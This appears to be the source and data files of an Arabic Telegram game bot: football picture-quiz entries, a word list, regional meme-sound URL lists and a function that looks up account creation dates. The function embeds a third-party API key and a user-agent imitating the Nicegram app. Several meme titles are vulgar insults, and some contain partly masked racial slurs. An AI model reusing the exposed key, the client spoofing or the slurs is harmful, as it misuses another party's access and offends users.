            "answer": "علي البليهي",
            "caption": "وش اسم الاعب ؟",
            "photo": "https://t.me/LANBOT2/58"
        },
        {
            "answer": "جحفلي",
            "caption": "وش اسم الاعب ؟",
            "photo": "https://t.me/LANBOT2/60"
        },
        {
            "answer": "الشلهوب",
            "caption": "وش اسم الاعب ؟",
            "photo": "https://t.me/LANBOT2/62"
        },
        {
            "answer": "محمد البريك",
            "caption": "وش اسم الاعب ؟",
            "photo": "https://t.me/LANBOT2/64"
        },
        {
            "answer": "سعود",
            "caption": "وش اسم الاعب ؟",
            "photo": "https://t.me/LANBOT2/66"
        },
        {
            "answer": "ياسر الشهراني",
            "caption": "وش اسم الاعب ؟",
            "photo": "https://t.me/LANBOT2/70"
        },
        {
            "answer": "كريستيانو رونالدو",
            "caption": "وش اسم الاعب ؟",
            "photo": "https://t.me/LANBOT2/72"
        },
        {
            "answer": "امبابي",
            "caption": "وش اسم الاعب ؟",
            "photo": "https://t.me/LANBOT2/74"
        },
        {
            "answer": "مودريتش",
            "caption": "وش اسم الاعب ؟",
            "photo": "https://t.me/LANBOT2/76"
        },
        {
            "answer": "بنزيما",
            "caption": "وش اسم الاعب ؟",
            "photo": "https://t.me/LANBOT2/78"
        },
        {
            "answer": "نيمار",
            "caption": "وش اسم الاعب ؟",
            "photo": "https://t.me/LANBOT2/80"
        },
        {
            "answer": "ميسي",
            "caption": "وش اسم الاعب ؟",
            "photo": "https://t.me/LANBOT2/82"
        },
        {
            "answer": "راموس",
            "caption": "وش اسم الاعب ؟",
            "photo": "https://t.me/LANBOT2/84"
        },
        {
            "answer": "اشرف حكيمي",
            "caption": "وش اسم الاعب ؟",
            "photo": "https://t.me/LANBOT2/86"
        },
        {
            "answer": "ماركينيوس",
            "caption": "وش اسم الاعب ؟",
            "photo": "https://t.me/LANBOT2/88"
        },
        {
            "answer": "محمد صلاح",
            "caption": "وش اسم الاعب ؟",
            "photo": "https://t.me/LANBOT2/90"
        },
        {
            "answer": "هازارد",
            "caption": "وش اسم الاعب ؟",
            "photo": "https://t.me/LANBOT2/92"
        },
        {
            "answer": "مالديني",
            "caption": "وش اسم الاعب ؟",
            "photo": "https://t.me/LANBOT2/94"
        },
        {
            "answer": "انيستا",
            "caption": "وش اسم الاعب ؟",
            "photo": "https://t.me/LANBOT2/96"
        },
        {
            "answer": "تشافي",
            "caption": "وش اسم الاعب ؟",
            "photo": "https://t.me/LANBOT2/98"
        },
        {
            "answer": "بيكيه",
            "caption": "وش اسم الاعب ؟",
            "photo": "https://t.me/LANBOT2/100"
        },
        {
            "answer": "بيل",
            "caption": "وش اسم الاعب ؟",
            "photo": "https://t.me/LANBOT2/102"
        },
        {
            "answer": "1995",
            "caption": "الصوره هذي في اي عام ؟",
            "photo": "https://t.me/LANBOT2/104"
        },
        {
            "answer": "1997",
            "caption": "الصوره هذي في اي عام ؟",
            "photo": "https://t.me/LANBOT2/106"
        },
        {
            "answer": "1998",
            "caption": "الصوره هذي في اي عام ؟",
            "photo": "https://t.me/LANBOT2/108"
        },
        {
            "answer": "1999",
            "caption": "الصوره هذي في اي عام ؟",
            "photo": "https://t.me/LANBOT2/110"
        },
        {
            "answer": "2002",
            "caption": "الصوره هذي في اي عام ؟",
            "photo": "https://t.me/LANBOT2/112"
        },
        {
            "answer": "2005",
            "caption": "الصوره هذي في اي عام ؟",
            "photo": "https://t.me/LANBOT2/114"
        },
        {
            "answer": "2007",
            "caption": "الصوره هذي في اي عام ؟",
            "photo": "https://t.me/LANBOT2/116"
        },
        {
            "answer": "2008",
            "caption": "الصوره هذي في اي عام ؟",
            "photo": "https://t.me/LANBOT2/118"
        },
        {
            "answer": "2009",
            "caption": "الصوره هذي في اي عام ؟",
            "photo": "https://t.me/LANBOT2/120"
        },
        {
            "answer": "2000",
            "caption": "الصوره هذي في اي عام ؟",
            "photo": "https://t.me/LANBOT2/122"
        },
        {
            "answer": "انشيلوتي",
            "caption": "وش اسم المدرب ؟",
            "photo": "https://t.me/LANBOT2/124"
        },
        {
            "answer": "مورينيو",
            "caption": "وش اسم المدرب ؟",
            "photo": "https://t.me/LANBOT2/126"
        },
        {
            "answer": "بيب غوارديولا",
            "caption": "وش اسم المدرب ؟",
            "photo": "https://t.me/LANBOT2/128"
        },
        {
            "answer": "هيرفي رينارد",
            "caption": "وش اسم المدرب ؟",
            "photo": "https://t.me/LANBOT2/130"
        },
        {
            "answer": "زيدان",
            "caption": "وش اسم المدرب ؟",
            "photo": "https://t.me/LANBOT2/132"
        }
]
tarkeeb = [
    "اناث",
    "ثيران",
    "دروس",
    "فحص",
    "رجال",
    "كتب",
    "ضغوط",
    "صف",
    "رجب",
    "اسد",
    "وقع",
    "ملك",
    "فصل",
    "كلاب",
    "صقور",
    "عقد",
    "بحور",
    "هاتف",
    "حدائق",
    "مسرح",
    "جرائم",
    "مدارس",
    "منزل",
    "كرسي",
    "مناطق",
    "بيوت",
    "بنك",
    "علم",
    "وظائف",
    "طلاب",
    "مراحل",
    "فنانين",
    "صواريخ"
]
# ==================== FILE: get_create.py ====================

'''




def get_creation_date(id: int) -> str:
	if str(id)[0] == '5' and str(id)[1] == '9':
		return '01/2023'
	if len(str(id)) == 10:
		if str(id)[0] == '5':
			if not str(id)[1] == '0':
				return '0{}/2022'.format(str(id).replace("0","")[2])
			else:
				return '0{}/2022'.format(str(id)[2])
		elif str(id)[0] == '1' and str(id)[1] == '0':
			if '11' in str(id):
				return '11/2020'
			if '12' in str(id):
				return '12/2020'
			else:
				return '0{}/2020'.format(str(id).replace("0","")[2])
		else:
			if '11' in str(id):
				return '11/2021'
			if '12' in str(id):
				return '12/2021'
			if '10' in str(id):
				return '10/2021'
			else:
				return '0{}/2021'.format(str(id).replace("0","")[1])
	if len(str(id)) == 9:
		if str(id)[0] == '9':
			return '0{}/2020'.format(str(id).replace("0","")[0])
		else:
			return get_date_as_string(id)[1]
	else:
		return get_date_as_string(id)[1]
'''


def get_creation_date(id: int) -> str:
    if r.get(f'{id}:CreateDate'):
      return r.get(f'{id}:CreateDate')
    else:
      url = "https://restore-access.indream.app/regdate"
      headers = {
        "accept": "*/*",
        "content-type": "application/x-www-form-urlencoded",
        "user-agent": "Nicegram/92 CFNetwork/1390 Darwin/22.0.0",
        "x-api-key": "e758fb28-79be-4d1c-af6b-066633ded128",
        "accept-language": "en-US,en;q=0.9"
      }
      data = {"telegramId":id}
      res = requests.post(url, headers=headers, json=data)
      r.set(f'{id}:CreateDate',res.json()['data']['date'].replace('-','/'))
      return res.json()['data']['date'].replace('-','/')




# ==================== FILE: memes.py ====================
memes_eg = [
    {
        "title": "VINE BOOM SOUND",
        "url": "https://www.myinstants.com/media/sounds/vine-boom.mp3"
    },
    {
        "title": "لايك الزعامة",
        "url": "https://www.myinstants.com/media/sounds/lyk-lz-m.mp3"
    },
    {
        "title": "AUGHHHHH... AUGHHHHH",
        "url": "https://www.myinstants.com/media/sounds/aughhhhh-aughhhhh.mp3"
    },
    {
        "title": "البلبل",
        "url": "https://www.myinstants.com/media/sounds/lblbl.mp3"
    },
    {
        "title": "انا حجيبو من طيزو",
        "url": "https://www.myinstants.com/media/sounds/my-video4_y6LHvM4.mp3"
    },
    {
        "title": "انا عملت ايه",
        "url": "https://www.myinstants.com/media/sounds/n-mlt-yh.mp3"
    },
    {
        "title": "بهجت صابرضحكه",
        "url": "https://www.myinstants.com/media/sounds/bhjt-sbrdhkh.mp3"
    },
    {
        "title": "Pew_Pew",
        "url": "https://www.myinstants.com/media/sounds/pew_pew-dknight556-1379997159.mp3"
    },
    {
        "title": "Fart",
        "url": "https://www.myinstants.com/media/sounds/dry-fart.mp3"
    },
    {
        "title": "بهجت المصري",
        "url": "https://www.myinstants.com/media/sounds/____lmBu5e9.mp3"
    },
    {
        "title": "Run Meme",
        "url": "https://www.myinstants.com/media/sounds/awolnation-run-audio-mp3cut_TdXTLux.mp3"
    },
    {
        "title": "Augh Augh AAAAAAUUUUUUGH",
        "url": "https://www.myinstants.com/media/sounds/augh-augh-aaaaaauuuuuugh.mp3"
    },
    {
        "title": "جاي اقولك احا",
        "url": "https://www.myinstants.com/media/sounds/jy-qwlk-h.mp3"
    },
    {
        "title": "لا نخشى الا الله",
        "url": "https://www.myinstants.com/media/sounds/l-nkhsh-l-llh.mp3"
    },
    {
        "title": "اسكت",
        "url": "https://www.myinstants.com/media/sounds/my-video1_KRP2y6Q.mp3"
    },
    {
        "title": "Mr Beast Phonk Meme",
        "url": "https://www.myinstants.com/media/sounds/mr-beast-phonk-meme.mp3"
    },
    {
        "title": "نبيه اوي بكسمك",
        "url": "https://www.myinstants.com/media/sounds/nbyh-wy-bksmk.mp3"
    },
    {
        "title": "متبطلو منياكه",
        "url": "https://www.myinstants.com/media/sounds/mtbtlw-mnykh.mp3"
    },
    {
        "title": "Sad Violin (the meme one)",
        "url": "https://www.myinstants.com/media/sounds/tf_nemesis.mp3"
    },
    {
        "title": "فلوسي فين يبن الوسخة",
        "url": "https://www.myinstants.com/media/sounds/_______mp3_70k_pitch_0_00_tempo.mp3"
    },
    {
        "title": "تبا لك",
        "url": "https://www.myinstants.com/media/sounds/tb-lk.mp3"
    },
    {
        "title": "دا انت عيل بضان",
        "url": "https://www.myinstants.com/media/sounds/m_fixed_PdzqC7c.mp3"
    },
    {
        "title": "اومال",
        "url": "https://www.myinstants.com/media/sounds/m_fixed_0kkdFhN.mp3"
    },
    {
        "title": "ابراهيم ارحمني",
        "url": "https://www.myinstants.com/media/sounds/tmprrkoe6go.mp3"
    },
    {
        "title": "ايه القرف ده يا جدعان",
        "url": "https://www.myinstants.com/media/sounds/yh-lqrf-dh-y-jd-n.mp3"
    },
    {
        "title": "صدقني لو اعرف",
        "url": "https://www.myinstants.com/media/sounds/08682c5420f86c73.mp3"
    },
    {
        "title": "الله اكبر عليك",
        "url": "https://www.myinstants.com/media/sounds/______I6418kK.mp3"
    },
    {
        "title": "Yamate Kudesai",
        "url": "https://www.myinstants.com/media/sounds/yamate-kudesai.mp3"
    },
    {
        "title": "تتمنيك علي؟",
        "url": "https://www.myinstants.com/media/sounds/1080p_hd_1_2.mp3"
    },
    {
        "title": "هههههه",
        "url": "https://www.myinstants.com/media/sounds/tmpqpi5roql.mp3"
    },
    {
        "title": "GTA SA Mission Passed",
        "url": "https://www.myinstants.com/media/sounds/gta-san-andreas-mission-complete-sound-hq.mp3"
    },
    {
        "title": "بيدور عليا",
        "url": "https://www.myinstants.com/media/sounds/bydwr-ly.mp3"
    },
    {
        "title": "Sha5ra",
        "url": "https://www.myinstants.com/media/sounds/55501.mp3"
    },
    {
        "title": "سدي تبعك وانت تنتاك",
        "url": "https://www.myinstants.com/media/sounds/my-video2_HKPo5jC.mp3"
    },
    {
        "title": "حياتي بقيت اجمل بكثير",
        "url": "https://www.myinstants.com/media/sounds/hyty-bqyt-jml-bkthyr.mp3"
    },
    {
        "title": "خد صمبوصة",
        "url": "https://www.myinstants.com/media/sounds/khd-smbws.mp3"
    }
]
memes_ae = [
    {
        "title": "i like ya cut g (Taco Bell)",
        "url": "https://www.myinstants.com/media/sounds/i-like-ya-cut-g-taco-bell_Bis4GQX.mp3"
    },
    {
        "title": "my son so dumb iq 21",
        "url": "https://www.myinstants.com/media/sounds/my-son-so-dumb-iq-21.mp3"
    },
    {
        "title": "Mr Beast Phonk Meme",
        "url": "https://www.myinstants.com/media/sounds/mr-beast-phonk-meme.mp3"
    },
    {
        "title": "the weeknd rizzz",
        "url": "https://www.myinstants.com/media/sounds/the-weeknd-rizzz.mp3"
    },
    {
        "title": "Ahhhhhhhhhhhhhhhhhhhh",
        "url": "https://www.myinstants.com/media/sounds/aaa_10_3mj8PTE.mp3"
    },
    {
        "title": "Nokia Arabic Ringstone",
        "url": "https://www.myinstants.com/media/sounds/nokia-ringtone-arabic.mp3"
    },
    {
        "title": "AUGHHHHH... AUGHHHHH",
        "url": "https://www.myinstants.com/media/sounds/aughhhhh-aughhhhh.mp3"
    },
    {
        "title": "VINE BOOM SOUND",
        "url": "https://www.myinstants.com/media/sounds/vine-boom.mp3"
    },
    {
        "title": "لا ارفسك فطيزك",
        "url": "https://www.myinstants.com/media/sounds/m_fixed_4BemNPO.mp3"
    },
    {
        "title": "yes yes yes skibidi",
        "url": "https://www.myinstants.com/media/sounds/yes-yes-yes-skibidi.mp3"
    },
    {
        "title": "STFU YOU NASTY BTCH 1.75 SPEED UP",
        "url": "https://www.myinstants.com/media/sounds/stfu-you-nasty-btch-1-75-speed-up.mp3"
    },
    {
        "title": "Lightskin Rizz (Sin City)",
        "url": "https://www.myinstants.com/media/sounds/lightskin-rizz-sin-city.mp3"
    },
    {
        "title": "BRUH",
        "url": "https://www.myinstants.com/media/sounds/movie_1.mp3"
    },
    {
        "title": "افتح الباب يكس امك",
        "url": "https://www.myinstants.com/media/sounds/my-video_EiYCJcZ.mp3"
    },
    {
        "title": "oh my god bro oh hell nah man",
        "url": "https://www.myinstants.com/media/sounds/oh-my-god-bro-oh-hell-nah-man.mp3"
    },
    {
        "title": "ga ga ga ga",
        "url": "https://www.myinstants.com/media/sounds/ga-ga-ga-ga.mp3"
    },
    {
        "title": "Meme final",
        "url": "https://www.myinstants.com/media/sounds/meme-de-creditos-finales.mp3"
    },
    {
        "title": "Emotional Damage Meme",
        "url": "https://www.myinstants.com/media/sounds/emotional-damage-meme.mp3"
    },
    {
        "title": "FBI OPEN UP (with explosion)",
        "url": "https://www.myinstants.com/media/sounds/fbi-open-up_dwLhIFf.mp3"
    },
    {
        "title": "chinese guy rap",
        "url": "https://www.myinstants.com/media/sounds/video0-online-audio-converter_L0R7wUM.mp3"
    },
    {
        "title": "Coffin Dance Meme",
        "url": "https://www.myinstants.com/media/sounds/y2mate-mp3cut_sRzY6rh.mp3"
    },
    {
        "title": "goofy ahhs",
        "url": "https://www.myinstants.com/media/sounds/goofy-ahh-sounds.mp3"
    },
    {
        "title": "يالحماار",
        "url": "https://www.myinstants.com/media/sounds/m_fixed_bu9qkNx.mp3"
    },
    {
        "title": "NFL Bass Boosted",
        "url": "https://www.myinstants.com/media/sounds/nfl.mp3"
    },
    {
        "title": "حرام عليكم",
        "url": "https://www.myinstants.com/media/sounds/hrm-lykm.mp3"
    },
    {
        "title": "Wednesday skibidi",
        "url": "https://www.myinstants.com/media/sounds/wednesday-skibidi.mp3"
    },
    {
        "title": "Death (Fortnite)",
        "url": "https://www.myinstants.com/media/sounds/tmp_7901-951678082.mp3"
    },
    {
        "title": "Who tf is Giga nig**",
        "url": "https://www.myinstants.com/media/sounds/who-tf-is-giga-nig.mp3"
    },
    {
        "title": "another love",
        "url": "https://www.myinstants.com/media/sounds/another-love.mp3"
    },
    {
        "title": "التفله",
        "url": "https://www.myinstants.com/media/sounds/m_fixed_40MBUEz.mp3"
    },
    {
        "title": "Despicable me whistle song",
        "url": "https://www.myinstants.com/media/sounds/despicable-me-whistle-song.mp3"
    },
    {
        "title": "WAKANDA FOREVER AAAAAHHHH",
        "url": "https://www.myinstants.com/media/sounds/wakanda-forever-aaaaahhhh.mp3"
    },
    {
        "title": "Fart Button",
        "url": "https://www.myinstants.com/media/sounds/perfect-fart.mp3"
    },
    {
        "title": "Anime Wow",
        "url": "https://www.myinstants.com/media/sounds/anime-wow-sound-effect.mp3"
    },
    {
        "title": "Bloody f**k you bloody bastard b*tch",
        "url": "https://www.myinstants.com/media/sounds/bloody-fuck-you-bloody_Jzdok0G.mp3"
    },
    {
        "title": "سلتوح كل تبن",
        "url": "https://www.myinstants.com/media/sounds/m_fixed_vycJ8OK.mp3"
    }
]
memes_sa = [
    {
        "title": "VINE BOOM SOUND",
        "url": "https://www.myinstants.com/media/sounds/vine-boom.mp3"
    },
    {
        "title": "Fortnite default dance bass bo",
        "url": "https://www.myinstants.com/media/sounds/fortnite-default-dance-bass-boosted.mp3"
    },
    {
        "title": "التفله",
        "url": "https://www.myinstants.com/media/sounds/m_fixed_40MBUEz.mp3"
    },
    {
        "title": "عمي يا صياد",
        "url": "https://www.myinstants.com/media/sounds/hunter.mp3"
    },
    {
        "title": "Hello your computer has virus",
        "url": "https://www.myinstants.com/media/sounds/hello-your-computer-has-virus-sound-effect.mp3"
    },
    {
        "title": "Fart",
        "url": "https://www.myinstants.com/media/sounds/dry-fart.mp3"
    },
    {
        "title": "donation iyi",
        "url": "https://www.myinstants.com/media/sounds/best-donation-sound-for-ever.mp3"
    },
    {
        "title": "suiiiiiii",
        "url": "https://www.myinstants.com/media/sounds/suiiiiiii.mp3"
    },
    {
        "title": "حط اسبعك في",
        "url": "https://www.myinstants.com/media/sounds/ht-sb-k-fy.mp3"
    },
    {
        "title": "windows xp bass boosted",
        "url": "https://www.myinstants.com/media/sounds/y2mate_9XXvzy4.mp3"
    },
    {
        "title": "Anime Wow",
        "url": "https://www.myinstants.com/media/sounds/anime-wow-sound-effect.mp3"
    },
    {
        "title": "ايشتبي",
        "url": "https://www.myinstants.com/media/sounds/m_fixed_O8F3kds.mp3"
    },
    {
        "title": "Amogus Full",
        "url": "https://www.myinstants.com/media/sounds/2021-04-07-213841761.mp3"
    },
    {
        "title": "among us yellow sus",
        "url": "https://www.myinstants.com/media/sounds/troll-face-among-us-meme.mp3"
    },
    {
        "title": "Sneaky Snitch",
        "url": "https://www.myinstants.com/media/sounds/untitled_897.mp3"
    },
    {
        "title": "Naruto Sad Song",
        "url": "https://www.myinstants.com/media/sounds/naruto-sad-music-instant.mp3"
    },
    {
        "title": "aughhhh tiktok",
        "url": "https://www.myinstants.com/media/sounds/aughhhh-tiktok.mp3"
    },
    {
        "title": "FAIL SOUND MEME",
        "url": "https://www.myinstants.com/media/sounds/fail-sound-effect.mp3"
    },
    {
        "title": "DaBaby Lets Go BASS BOOSTED",
        "url": "https://www.myinstants.com/media/sounds/dababy_lets_gooooo_sound_effect_template_no_copyright_bass_boosted.mp3"
    },
    {
        "title": "outro song",
        "url": "https://www.myinstants.com/media/sounds/outro-song_oqu8zAg.mp3"
    },
    {
        "title": "لي هونا",
        "url": "https://www.myinstants.com/media/sounds/my-video1_1gwn524.mp3"
    },
    {
        "title": "Censor Beep 3 ",
        "url": "https://www.myinstants.com/media/sounds/censor-beep-3.mp3"
    },
    {
        "title": "bing chilling",
        "url": "https://www.myinstants.com/media/sounds/bing-chilling_fcdGgUc.mp3"
    },
    {
        "title": "الو السلام عليكم",
        "url": "https://www.myinstants.com/media/sounds/lw-lslm-lykm.mp3"
    },
    {
        "title": "To be Continued (jojo)",
        "url": "https://www.myinstants.com/media/sounds/untitled_1071.mp3"
    },
    {
        "title": "هههههه",
        "url": "https://www.myinstants.com/media/sounds/tmpqpi5roql.mp3"
    },
    {
        "title": "موتنا موتنا",
        "url": "https://www.myinstants.com/media/sounds/tmpv9rdyy9z.mp3"
    },
    {
        "title": "انا عملت ايه",
        "url": "https://www.myinstants.com/media/sounds/n-mlt-yh.mp3"
    },
    {
        "title": "Strong punch",
        "url": "https://www.myinstants.com/media/sounds/strongpunch_1.mp3"
    },
    {
        "title": "سب فورت نايت",
        "url": "https://www.myinstants.com/media/sounds/sb-fwrt-nyt.mp3"
    },
    {
        "title": "and his name is John Cenaaaaaa",
        "url": "https://www.myinstants.com/media/sounds/and-his-name-is-john-cena-1.mp3"
    },
    {
        "title": "والله انت قي",
        "url": "https://www.myinstants.com/media/sounds/my-video5_iJYlNan.mp3"
    },
    {
        "title": "Emotional Damage Meme",
        "url": "https://www.myinstants.com/media/sounds/emotional-damage-meme.mp3"
    },
    {
        "title": "Hello It&#x27;s John Cena",
        "url": "https://www.myinstants.com/media/sounds/hello-its-john-cena.mp3"
    },
    {
        "title": "SpongeBob Fail",
        "url": "https://www.myinstants.com/media/sounds/spongebob-fail.mp3"
    },
    {
        "title": "Pablo MEME",
        "url": "https://www.myinstants.com/media/sounds/yt1s_NSjFWNC.mp3"
    }
]
memes_sy = [
    {
        "title": "Meme final",
        "url": "https://www.myinstants.com/media/sounds/meme-de-creditos-finales.mp3"
    },
    {
        "title": "oh no no no laugh",
        "url": "https://www.myinstants.com/media/sounds/oh-no-no-no-no-laugh.mp3"
    },
    {
        "title": "Nani FULL",
        "url": "https://www.myinstants.com/media/sounds/nani-meme-sound-effect.mp3"
    },
    {
        "title": "instagram thud",
        "url": "https://www.myinstants.com/media/sounds/vine-boom-sound-effect_KT89XIq.mp3"
    },
    {
        "title": "And his name is onichan",
        "url": "https://www.myinstants.com/media/sounds/and-his-name-is-john-cena-1-mp3cutnet_myztlbnn.mp3"
    },
    {
        "title": "VINE BOOM SOUND",
        "url": "https://www.myinstants.com/media/sounds/vine-boom.mp3"
    },
    {
        "title": "Windows XP Error",
        "url": "https://www.myinstants.com/media/sounds/erro.mp3"
    },
    {
        "title": "It was at this moment",
        "url": "https://www.myinstants.com/media/sounds/it-was-at-this-moment-that-he-he-knew-he-f-cked-up_mIzVbMC.mp3"
    },
    {
        "title": "musica triste meme",
        "url": "https://www.myinstants.com/media/sounds/tmpq7mpzzl9.mp3"
    },
    {
        "title": "لانك حريمة",
        "url": "https://www.myinstants.com/media/sounds/m_fixed_KJkMDts.mp3"
    },
    {
        "title": "The meme of many memes",
        "url": "https://www.myinstants.com/media/sounds/and-his-name-is-fart.mp3"
    },
    {
        "title": "YouTube UWUUUUU",
        "url": "https://www.myinstants.com/media/sounds/youtube-uwuuuuu.mp3"
    },
    {
        "title": "Scary Maze Game Scream Sound",
        "url": "https://www.myinstants.com/media/sounds/final_60108db6919bc200b087a3a2_239343.mp3"
    },
    {
        "title": "BRUH",
        "url": "https://www.myinstants.com/media/sounds/movie_1.mp3"
    },
    {
        "title": "Sad Violin (the meme one)",
        "url": "https://www.myinstants.com/media/sounds/tf_nemesis.mp3"
    },
    {
        "title": "FNAF Jumpscare Scream",
        "url": "https://www.myinstants.com/media/sounds/five-nights-at-freddys-full-scream-sound_2.mp3"
    },
    {
        "title": "To be Continued (jojo)",
        "url": "https://www.myinstants.com/media/sounds/untitled_1071.mp3"
    },
    {
        "title": "Anime Wow",
        "url": "https://www.myinstants.com/media/sounds/anime-wow-sound-effect.mp3"
    },
    {
        "title": "omae wa mou shindeiru NANI",
        "url": "https://www.myinstants.com/media/sounds/nani_Pmxf5n3.mp3"
    },
    {
        "title": "ROBLOX oof",
        "url": "https://www.myinstants.com/media/sounds/roblox-death-sound_1.mp3"
    },
    {
        "title": "slap31",
        "url": "https://www.myinstants.com/media/sounds/slap-sound-effect-free.mp3"
    },
    {
        "title": "hehe boi ainsley harriott",
        "url": "https://www.myinstants.com/media/sounds/ainsley_harriott_and_his_spicy_meatconverttoaudio.mp3"
    },
    {
        "title": "Noooo!",
        "url": "https://www.myinstants.com/media/sounds/nooo.swf.mp3"
    },
    {
        "title": "HELLO MOTHER F**kER DONTEFLON",
        "url": "https://www.myinstants.com/media/sounds/hello_motherfrucker.mp3"
    },
    {
        "title": "GTA SA Mission Passed",
        "url": "https://www.myinstants.com/media/sounds/gta-san-andreas-mission-complete-sound-hq.mp3"
    },
    {
        "title": "This is Sparta!!",
        "url": "https://www.myinstants.com/media/sounds/thisissparta.swf.mp3"
    },
    {
        "title": "and his name is John Cenaaaaaa",
        "url": "https://www.myinstants.com/media/sounds/and-his-name-is-john-cena-1.mp3"
    },
    {
        "title": "nope.avi",
        "url": "https://www.myinstants.com/media/sounds/engineer_no01.mp3"
    },
    {
        "title": "FBI open UP",
        "url": "https://www.myinstants.com/media/sounds/fbi-open-up-sfx.mp3"
    },
    {
        "title": "NO GOD! PLEASE NO!!! NOOOOOOOO",
        "url": "https://www.myinstants.com/media/sounds/no-god-please-no-noooooooooo.mp3"
    },
    {
        "title": "Darth Vader NOOOOOOOOO!",
        "url": "https://www.myinstants.com/media/sounds/nooo.mp3"
    },
    {
        "title": "MLG AIR HORN!!!!!!!!!!!",
        "url": "https://www.myinstants.com/media/sounds/mlg-airhorn.mp3"
    },
    {
        "title": "Enemy Spotted",
        "url": "https://www.myinstants.com/media/sounds/counter-strike-jingle-cs-radio-enemy-spotted.mp3"
    },
    {
        "title": "Discord Notification",
        "url": "https://www.myinstants.com/media/sounds/discord-notification.mp3"
    },
    {
        "title": "Tuturu",
        "url": "https://www.myinstants.com/media/sounds/tuturu_1.mp3"
    },
    {
        "title": "Mission Failed",
        "url": "https://www.myinstants.com/media/sounds/dank-meme-compilation-volume-17_cutted.mp3"
    }
]
memes_us = [
    {
        "title": "VINE BOOM SOUND",
        "url": "https://www.myinstants.com/media/sounds/vine-boom.mp3"
    },
    {
        "title": "Whopper Ad",
        "url": "https://www.myinstants.com/media/sounds/whopper-ad.mp3"
    },
    {
        "title": "goofy ahhs",
        "url": "https://www.myinstants.com/media/sounds/goofy-ahh-sounds.mp3"
    },
    {
        "title": "Open the noor!",
        "url": "https://www.myinstants.com/media/sounds/open-the-noor.mp3"
    },
    {
        "title": "BRUH",
        "url": "https://www.myinstants.com/media/sounds/movie_1.mp3"
    },
    {
        "title": "STFU YOU NASTY BTCH 1.75 SPEED UP",
        "url": "https://www.myinstants.com/media/sounds/stfu-you-nasty-btch-1-75-speed-up.mp3"
    },
    {
        "title": "Oh, these? My boobies.",
        "url": "https://www.myinstants.com/media/sounds/oh-these-my-boobies_iVWVI5p.mp3"
    },
    {
        "title": "Taco Bell Bong",
        "url": "https://www.myinstants.com/media/sounds/taco-bell-bong-sfx.mp3"
    },
    {
        "title": "SpongeBob Fail",
        "url": "https://www.myinstants.com/media/sounds/spongebob-fail.mp3"
    },
    {
        "title": "NFL Bass Boosted",
        "url": "https://www.myinstants.com/media/sounds/nfl.mp3"
    },
    {
        "title": "Rizzs",
        "url": "https://www.myinstants.com/media/sounds/rizz-sounds.mp3"
    },
    {
        "title": "Anime Wow",
        "url": "https://www.myinstants.com/media/sounds/anime-wow-sound-effect.mp3"
    },
    {
        "title": "Fortnite default dance bass bo",
        "url": "https://www.myinstants.com/media/sounds/fortnite-default-dance-bass-boosted.mp3"
    },
    {
        "title": "im the biggest bird",
        "url": "https://www.myinstants.com/media/sounds/im-the-biggest-bird.mp3"
    },
    {
        "title": "Death (Fortnite)",
        "url": "https://www.myinstants.com/media/sounds/tmp_7901-951678082.mp3"
    },
    {
        "title": "peter griffin you stupid n",
        "url": "https://www.myinstants.com/media/sounds/peter-griffin-you-stupid-n_mTQEszX.mp3"
    },
    {
        "title": "Lightskin Rizz (Sin City)",
        "url": "https://www.myinstants.com/media/sounds/lightskin-rizz-sin-city.mp3"
    },
    {
        "title": "4 Big Guy&#x27;s",
        "url": "https://www.myinstants.com/media/sounds/4-big-guys_Tw2LfcY.mp3"
    },
    {
        "title": "Fart Button",
        "url": "https://www.myinstants.com/media/sounds/perfect-fart.mp3"
    },
    {
        "title": "I am a registered seggs offender",
        "url": "https://www.myinstants.com/media/sounds/i-am-a-registered-seggs-offender.mp3"
    },
    {
        "title": "Ohio ahh effect",
        "url": "https://www.myinstants.com/media/sounds/ohio-ahh-sound-effect.mp3"
    },
    {
        "title": "Emotional Damage Meme",
        "url": "https://www.myinstants.com/media/sounds/emotional-damage-meme.mp3"
    },
    {
        "title": "P-hub intro",
        "url": "https://www.myinstants.com/media/sounds/p-hub-intro.mp3"
    },
    {
        "title": "Strokingmy",
        "url": "https://www.myinstants.com/media/sounds/snaptik_6971208071070698758_real-shebrokerambo.mp3"
    },
    {
        "title": "Up the f***ing ass",
        "url": "https://www.myinstants.com/media/sounds/up-the-f-ing-ass.mp3"
    },
    {
        "title": "fart with reverb",
        "url": "https://www.myinstants.com/media/sounds/fart-with-reverb.mp3"
    },
    {
        "title": "AUGHHHHH... AUGHHHHH",
        "url": "https://www.myinstants.com/media/sounds/aughhhhh-aughhhhh.mp3"
    },
    {
        "title": "We do not care (TikTok Sound)",
        "url": "https://www.myinstants.com/media/sounds/we-do-not-care_phB0mEB.mp3"
    },
    {
        "title": "chinese guy rap",
        "url": "https://www.myinstants.com/media/sounds/video0-online-audio-converter_L0R7wUM.mp3"
    },
    {
        "title": "Pew_Pew",
        "url": "https://www.myinstants.com/media/sounds/pew_pew-dknight556-1379997159.mp3"
    },
    {
        "title": "Mr Beast Phonk Meme",
        "url": "https://www.myinstants.com/media/sounds/mr-beast-phonk-meme.mp3"
    },
    {
        "title": "Sad Violin (the meme one)",
        "url": "https://www.myinstants.com/media/sounds/tf_nemesis.mp3"
    },
    {
        "title": "Censor Beep 1",
        "url": "https://www.myinstants.com/media/sounds/censor-beep-1.mp3"
    },
    {
        "title": "my son so dumb iq 21",
        "url": "https://www.myinstants.com/media/sounds/my-son-so-dumb-iq-21.mp3"
    },
    {
        "title": "Despicable me whistle song",
        "url": "https://www.myinstants.com/media/sounds/despicable-me-whistle-song.mp3"
    },
    {
        "title": "GULP GULP GULP",
        "url": "https://www.myinstants.com/media/sounds/gulp-gulp-gulp.mp3"
    }
]
memes_iq = [
    {
        "url": "https://www.myinstants.com/media/sounds/tmptb9t24j2.mp3",
        "title": "السلام عليكم"
    },
    {
        "url": "https://www.myinstants.com/media/sounds.mp3",
        "title": "تلعب بوبجي"
    },
    {
        "url": "https://www.myinstants.com/media/sounds/tf_nemesis.mp3",
        "title": "Sad Violin (the meme one)"
    },
    {
        "url": "https://www.myinstants.com/media/sounds/vine-boom.mp3",
        "title": "VINE BOOM SOUND"
    },
    {
        "url": "https://www.myinstants.com/media/sounds/pew-pew-lame-sound-effect.mp3",
        "title": "Pew"
    },
    {
        "url": "https://www.myinstants.com/media/sounds/my-video1_zXxTpzs.mp3",
        "title": "شاطئ البحر"
    },
    {
        "url": "https://www.myinstants.com/media/sounds/f4f7f68c6ab93818-3.mp3",
        "title": "13moo"
    },
    {
        "url": "https://www.myinstants.com/media/sounds/tmprrkoe6go.mp3",
        "title": "ابراهيم ارحمني"
    },
    {
